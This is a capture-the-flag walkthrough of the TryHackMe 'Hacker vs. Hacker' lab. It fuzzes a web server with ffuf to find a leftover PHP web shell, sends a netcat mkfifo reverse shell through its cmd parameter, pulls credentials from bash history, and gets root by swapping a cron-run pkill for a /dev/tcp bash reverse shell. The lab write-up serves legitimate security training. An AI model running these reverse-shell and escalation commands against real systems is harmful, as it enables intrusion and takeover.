---
title: Walkthrough - Hacker vs. Hacker
published: true
---

Tags: Web Foothold, Enumeration.
Description: Someone has compromised this server already! Can you get in and evade their countermeasures?
Difficulty: Easy
URL: [https://tryhackme.com/room/hackervshacker](https://tryhackme.com/room/hackervshacker)

* * *

## Notes

> The server of this recruitment company appears to have been hacked, and the hacker has defeated all attempts by the admins to fix the machine. They can't shut it down (they'd lose SEO!) so maybe you can help?

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

Port 80 has a website and the upload form has been hacked.

Caputuring in burposuite we see the hacker left behind some code for us

```
<!-- seriously, dumb stuff:
$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}
-->
```

So we cant upload a shell, we cant access cvs. So maybe we can find the shell the hacker left over... We can use `fuff` which is a super easy to use fuzzer.

- `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.97/cvs/FUZZ.pdf.php`

Here we find shell. Lets check that out on the site. All we have is BOOM. We can use fuzz some more to extrapolate some more information about this php.

- `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.97/cvs/shell.pdf.php?FUZZ=id -fs 18` this command will exclude all results with 18 characters. And here we find `cmd` is the variable we are looking for.

Capture the request in burpsuite and send it to the repeater.

```
GET /cvs/shell.pdf.php?cmd=id HTTP/1.1
Host: 10.10.10.97
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

Since this is executing commands and sending us our ID we can edit this in order to send us a reverse shell. Setup netcat listener and lets try.

- use `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.127.225 6666 >/tmp/f` as the variables parameter and encode it as url to recieve reverse shell

```
GET /cvs/shell.pdf.php?cmd=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%32%2e%31%32%37%2e%32%32%35%20%36%36%36%36%20%3e%2f%74%6d%70%2f%66 HTTP/1.1
Host: 10.10.10.97
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

* * * 

## user.txt?

![0xskar](/assets/hackervshacker.png)

* * * 

## root.txt?

everytime we try to upgrade the shell we get noped out of it. kind of hilarious. hmm

```
cat /home/lachlan/.bash_history
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
```

We can login via ssh using these creds. But we keep getting kicked. 

- `cat /etc/cron.d/persistence`

root is running crontab that is executing pkill, we can use this to send us another revshell as root. quickly logging into ssh and executing the following command gives us root shell.

`echo "bash -c 'bash -i >& /dev/tcp/10.2.127.225/6667 0>&1'" > bin/pkill ; chmod  +x bin/pkill`

* * * 

